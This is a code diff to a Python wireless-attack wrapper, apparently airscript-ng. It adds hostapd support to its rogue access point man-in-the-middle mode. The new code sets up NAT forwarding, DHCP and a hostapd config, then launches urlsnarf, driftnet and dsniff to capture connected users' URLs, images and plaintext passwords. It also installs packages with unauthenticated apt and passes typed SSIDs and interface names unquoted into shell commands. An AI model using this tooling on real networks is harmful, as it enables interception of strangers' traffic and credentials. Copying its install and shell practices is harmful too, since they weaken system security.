@@ -11,6 +11,8 @@ class col:
     blue_deep = '\033[1;34;48m'
     warn_deep = '\033[1;33;48m'
     fail_deep = '\033[1;31;48m'
+    green_deep = '\033[1;32;48m'
+    endl_deep = '\033[1;39;48m'
 def update_this_script():
     check_depends()
     import subprocess,os
@@ -61,22 +63,55 @@ def get_wifi_cards_pick():
         else:
             get_card_name()
     get_card_name()
+def get_wifi_cards_pick_alt(choice):
+    import subprocess
+    iostream = subprocess.check_output
+    wireless_cards = []
+    index_array_alt = []
+    if choice == "1":
+        def_range = iostream("ls /sys/class/net/ | grep ^wl | wc -l",shell=True).decode("utf-8").rstrip()
+    elif choice == "2":
+        def_range = iostream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | wc -l" %(index_alt),shell=True).decode("utf-8").rstrip()
+    for i in range(1,int(def_range)+1):
+        if choice == "1":
+            wireless_cards.append(iostream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i),shell=True).decode("utf-8").rstrip())
+        elif choice == "2":
+            wireless_cards.append(iostream("ls /sys/class/net/ | grep -v \"lo\" | grep -v \"%s\" | head -n %s | tail -n 1" %(index_alt,i),shell=True).decode("utf-8").rstrip())
+        index_array_alt.append(i)
+        print("%sTo choose %s%s%s %senter %s[%s]%s" %(col.fail_deep,col.blue_deep,wireless_cards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl))
+    print("\n")
+    def get_card_name_alt():
+        global index_alt
+        dialog_array = ["\033[1;32;48m[+]\033[1;39;48mOk, Now which interface shall I host the AP on? \033[1;31;48m ~# \033[0;39;48m ","\033[1;32;48m[+]\033[1;39;48mWhich interface is connected to the internet? \033[1;31;48m ~# \033[0;39;48m "]
+        index_alt = ""
+        if choice == "1":
+            index_alt = input("%s" %(dialog_array[0]))
+        elif choice == "2":
+            index_alt = input("%s" %(dialog_array[1]))
+        if index_alt in [str(i) for i in index_array_alt]:
+            index_alt = wireless_cards[int(index_alt)-1]
+            return index_alt
+        else:
+            return get_card_name_alt()
+    return get_card_name_alt()
 def reaverspecialdeps():
     import os
     if os.system("ls ~/.airscriptNG/options.txt 2>/dev/null >/dev/null") != 0 or os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
-        os.system("mkdir ~/.airscriptNG/ 2>/dev/null;touch ~/.airscriptNG/options.txt;echo '1' > ~/.airscriptNG/options.txt;apt purge reaver -y 2>/dev/null >/dev/null")
+        os.system("mkdir ~/.airscriptNG/ 2>/dev/null;touch ~/.airscriptNG/options.txt;echo '1' > ~/.airscriptNG/options.txt;apt purge reaver -y 2>/dev/null")
         if os.system("ls backup-repos >/dev/null 2>/dev/null") != 0: 
             os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
-        xvar = os.system("sudo cat /etc/apt/sources.list | grep 'deb http://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
-        if xvar != 0:
-            os.system("lolxvarchartmp=$(mktemp -d) && cd $lolxvarchartmp && sudo cp /etc/apt/sources.list . && sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG' >> sources.list && mv sources.list /etc/apt/sources.list && cd .. && rmdir $lolxvarchartmp && cd ~/ && apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6 2>/dev/null")
+        xvar = os.system("sudo cat /etc/apt/sources.list | grep -i 'deb http://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
+        check_for_existing_repo = os.system("sudo cat /etc/apt/sources.list | grep -i 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
+        if xvar != 0 and check_for_existing_repo !=0:
+            os.system("tempvariableforscript=$(mktemp -d) && cd $tempvariableforscript && sudo cp /etc/apt/sources.list . && sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG' >> sources.list && mv sources.list /etc/apt/sources.list && cd .. && rmdir $tempvariableforscript && cd ~/ && apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6 2>/dev/null")
         depandancies()
-        os.system("echo \"$(cat /etc/apt/sources.list | grep -v 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG')\" > /etc/apt/sources.list")
+        if xvar != 0 and check_for_existing_repo !=0:
+            os.system("echo \"$(cat /etc/apt/sources.list | grep -v 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG')\" > /etc/apt/sources.list")
     else:
         check_depends()
 def mitm_fakeap_func():#FIX THIS
     try:
-        import os, time
+        import os, time, subprocess
         if os.system("ls -l /var/lib/dhcp/dhcpd.leases 2>/dev/null >/dev/null") != 0:
             os.system("touch /var/lib/dhcp/dhcpd.leases")
         global ch2
@@ -87,6 +122,10 @@ def mitm_fakeap_func():#FIX THIS
         ch2 = ""
         ch3 = ""
         ch4 = ""
+        selected_array = ["[\033[1;32;48mSELECTED\033[1;39;48m]","[\033[0;33;48mUNSELECTED\033[1;39;48m]","\n[\033[1;32;48mREQUIRED\033[1;39;48m]"]
+        slr = selected_array
+        options_avail_array = ["Host-ap with airbase-ng/hostapd","Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]","Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]","Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]"]
+        optn = options_avail_array
         os.system("clear")
         print("""\033[0;33;48m
 
@@ -102,10 +141,10 @@ def mitm_fakeap_func():#FIX THIS
         print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
         print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
         print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
-        print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
-        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept HTTP links and URLs - Type [\033[1;34;48m2\033[1;39;48m]")
-        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any images - Type [\033[1;34;48m3\033[1;39;48m]")
-        print("[\033[0;33;48mUNSELECTED\033[1;39;48m]- Intercept any unencrypted passwords (not currently working) - Type [\033[1;34;48m4\033[1;39;48m]")
+        print("%s- %s" %(slr[2],optn[0]))
+        print("%s- %s" %(slr[1],optn[1]))
+        print("%s- %s" %(slr[1],optn[2]))
+        print("%s- %s" %(slr[1],optn[3]))
         print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
         def help1():
             print("[\033[1;32;48mSELECTED\033[1;39;48m]- Intercept HTTP links and URLs")
@@ -140,7 +179,8 @@ def mitm_fakeap_func():#FIX THIS
             print("Please note that to host a fake AP and MITM internet traffic, you'll need \033[0;31;48mtwo network interfaces\033[0;39;48m")
             print("You are not limited to the options here, feel free to fire up any tool like wireshark.")
             print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
-            print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
+            #print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
+            print("%s- %s" %(slr[2],optn[0]))
         while True:
             if count < 2:
                 choc = input("\n\033[0;39;48mPlease choose two options, by entering the number.\033[1;31;48m ~# \033[0;39;48m")
@@ -190,18 +230,22 @@ def mitm_fakeap_func():#FIX THIS
         if crucial.lower().startswith("y"):
             os.system("clear")
             print("\n")
-            os.system("ls /sys/class/net | grep ^wl")
-            print("\n")
-            global airbase
-            airbase = input("\033[1;32;48m[+]\033[1;39;48mOk, Now which interface shall I host the AP on? \033[1;31;48m ~# \033[0;39;48m ")
-            airbase = str(airbase)
+            airbase = get_wifi_cards_pick_alt("1")
             os.system("clear")
             print("\n")
-            os.system("ls /sys/class/net | grep -v lo | grep -v '%s' " %(airbase))
-            print("\n")
-            global inetface
-            inetface = input("\033[1;32;48m[+]\033[1;39;48mWhich interface is connected to the internet? \033[1;31;48m ~# \033[0;39;48m ")
-            inetface = str(inetface)
+            inetface = get_wifi_cards_pick_alt("2")
+            global ap_host_method
+            ap_options_array = [["h","Hostapd"],["a","AIRBASE-NG"]]
+            ap_host_method = ""
+            print("\n%sIf unsure, choose [h]. Not working? choose [c]. %s\n" %(col.endl_deep,col.endl))
+            def get_ap_way():
+                ap_host_method = input("\033[1;32;48m[+]\033[1;39;48mWhat shall I use to host the AP? [%sh%s]ostapd or [%sa%s]irbase-ng? \033[1;31;48m ~# \033[0;39;48m  " %(col.green_deep,col.endl_deep,col.green_deep,col.endl_deep))
+                for i,q in ap_options_array:
+                    if ap_host_method.lower() == i:
+                        ap_host_method = q
+                        return ap_host_method
+                return get_ap_way()
+            ap_host_method = get_ap_way()
             global ssid
             ssid = input("\033[1;32;48m[?]\033[1;39;48mWhat shall I call the AP? (SSID) \033[1;31;48m ~# \033[0;39;48m ")
             ssid = str(ssid)
@@ -274,14 +318,16 @@ def mitm_fakeap_func():#FIX THIS
     \033[0;39;48m
             """)
             print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
-            print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
+            #print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
+            print("%s- %s" %(slr[2],optn[0]))
             if ch2 != "":
                 help1()
             if ch3 != "":
                 help2()    
             if ch4 != "":
                 help3()
-            print("\n[\033[1;32;48mINFO\033[1;39;48m]- SSID: %s" %(ssid))
+            print("\n[\033[1;32;48mINFO\033[1;39;48m]- AP HOSTING METHOD: %s" %(ap_host_method))
+            print("[\033[1;32;48mINFO\033[1;39;48m]- SSID: %s" %(ssid))
             print("[\033[1;32;48mINFO\033[1;39;48m]- CHANNEL: %s" %(channelno))
             print("[\033[1;32;48mINFO\033[1;39;48m]- AP INTERFACE: %s" %(airbase))
             print("[\033[1;32;48mINFO\033[1;39;48m]- INTERNET INTERFACE: %s" %(inetface))
@@ -296,28 +342,64 @@ def mitm_fakeap_func():#FIX THIS
                 #c3 = driftnet
                 #c4 = dsniff
                 #Common os.system stuff here
-                def c2c3():
-                    if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
-                        os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
-                        os.system("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
-                        os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,routeloop))
-                        os.system("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
-                        os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
-                        os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
-                c2c3()
-                if ch2 != "" and ch3 != "":
-                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelno,airbase))
-                if ch2 != "" and ch4 != "":
-                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
-                if ch3 != "" and ch4 != "":
-                    os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
+                if ap_host_method == "AIRBASE-NG":
+                    def c2c3():
+                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
+                        if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
+                            os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
+                            os.system("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
+                            os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,routeloop))
+                            os.system("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
+                            os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
+                    c2c3()
+                    if ch2 != "" and ch3 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelno,airbase))
+                    if ch2 != "" and ch4 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
+                    if ch3 != "" and ch4 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelno,airbase))
                 #END HERE
+                #START THE NEXT ONE HERE
+                elif ap_host_method == "Hostapd":
+                    def c3c4():
+                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
+                        if os.system("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
+                            os.system("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
+                            os.system("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'ifconfig %s 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase,subnet2,routeloop))
+                            os.system("echo 'dhcpd %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
+                            os.system("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
+                            os.system("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
+                            os.system("echo 'iptables --append FORWARD -j ACCEPT --in-interface %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
+                            os.system("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
+                    c3c4()
+                    check_for_hostapd = subprocess.call("ls ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
+                    if check_for_hostapd == 0:
+                        subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
+                    subprocess.call("touch ~/.airscriptNG/hostapd.conf",shell=True)
+                    subprocess.call("echo 'interface=%s' >> ~/.airscriptNG/hostapd.conf" %(airbase),shell=True)
+                    subprocess.call("echo 'driver=nl80211' >> ~/.airscriptNG/hostapd.conf",shell=True)
+                    subprocess.call("echo 'ssid=%s' >> ~/.airscriptNG/hostapd.conf" %(ssid),shell=True)
+                    subprocess.call("echo 'channel=%s' >> ~/.airscriptNG/hostapd.conf" %(channelno),shell=True)
+                    subprocess.call("killall hostapd 2>/dev/null",shell=True)
+                    subprocess.call("nmcli dev set %s managed no" %(airbase),shell=True)
+                    if ch2 != "" and ch3 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' " %(airbase,airbase,airbase))
+                    if ch2 != "" and ch4 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
+                    if ch3 != "" and ch4 != "":
+                        os.system("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
+                #END HERE FOR HOSTAPD
                 import atexit
                 def exynos():
                     import os
@@ -331,6 +413,10 @@ def mitm_fakeap_func():#FIX THIS
                         os.system("iptables --table nat --delete-chain")
                         os.system("service isc-dhcp-server stop")
                         os.system("rm /var/run/dhcpd.pid 2>/dev/null")
+                        subprocess.call("killall hostapd 2>/dev/null",shell=True)
+                        subprocess.call("nmcli dev set %s managed yes" %(airbase),shell=True)
+                        os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
+                        subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
                         os.system("clear")
                 atexit.register(exynos)
             elif randchoice.lower().startswith("n"):
@@ -359,6 +445,10 @@ def mitm_fakeap_func():#FIX THIS
             os.system("iptables --table nat --delete-chain")
             os.system("service isc-dhcp-server stop")
             os.system("rm /var/run/dhcpd.pid 2>/dev/null")
+            subprocess.call("killall hostapd 2>/dev/null",shell=True)
+            subprocess.call("nmcli dev set %s managed yes" %(airbase),shell=True)
+            os.system("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
+            subprocess.call("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null",shell=True)
             os.system("clear")
             #os.system("tac /etc/dhcp/dhcpd.conf | sed '1,10 d' | tac >> /etc/dhcp/dhcpd.conf") REALLY REALLY BROKEN!
             #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '#BY AIRSCRIPT-NG')\" > /etc/dhcp/dhcpd.conf")
@@ -373,6 +463,10 @@ def mitm_fakeap_func():#FIX THIS
             #os.system("echo \"$(cat /etc/dhcp/dhcpd.conf | grep -v '}')\" > /etc/dhcp/dhcpd.conf")
         else:
             os.system("clear")
+        #import traceback,sys#remove this
+        #print(traceback.format_exc())#remove this
+        #print(sys.exc_info()[0])#remove
+        #print(error_no)#remove
         os._exit(1)
 def handshake_func():
     #Start here
@@ -875,7 +969,7 @@ def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
         zcat = str(zcat)
         os.system("echo \"alias airscript-ng='python3 %s'\" >> ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" " %(zcat))
         print("\n\033[1;32;48mAlias has been successfully added to ~/.bash_aliases.\033[0;39;48m")
-        print("Invoke this script from anywhere by typing \"airscript-ng\" as the root user\n")
+        print("Invoke this script from anywhere by typing \"airscript-ng\" as the root user, now re-open this terminal!\n")
         os._exit(1)
     else:
         os.system("clear")
@@ -884,11 +978,11 @@ def depandancies(): #This is fine
     import os,time
     print("\033[1;33;48m[-] \033[0;37;48mUpdating system and installing some dependancies. Please hold!")
     os.system("echo '\033[1;32;48m[-] \033[0;37;48m25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '\033[1;32;48m[-] \033[0;37;48m50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
-    os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 gnome-terminal -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable'")
+    os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 apache2 gnome-terminal -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable && update-rc.d apache2 disable'")
     time.sleep(2)
 def check_depends(): #Still works
     import os,time
-    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal 2>/dev/null >/dev/null")
+    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal apache2 2>/dev/null >/dev/null")
     if x == 0:
         pass
     else:
@@ -1252,7 +1346,7 @@ def title(): #Works so far
             import os
             os.system("clear")
             if input("\033[0;32;48m\n[+]\033[0;38;48m|MENU|APT_UPDATE|(Update system and perform full-upgrade to system?) \033[0;32;48m [y/n]\033[0;34;48m>>").lower().startswith("y"):
-                os.system("sudo apt-get install xterm apt >> log.txt -y --allow-unauthenticated")
+                os.system("sudo apt-get install xterm apt >/dev/null -y --allow-unauthenticated")
                 os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
                 update_this_script()
                 print("\033[0;32;48mSystem is up to date, Goodbye!")
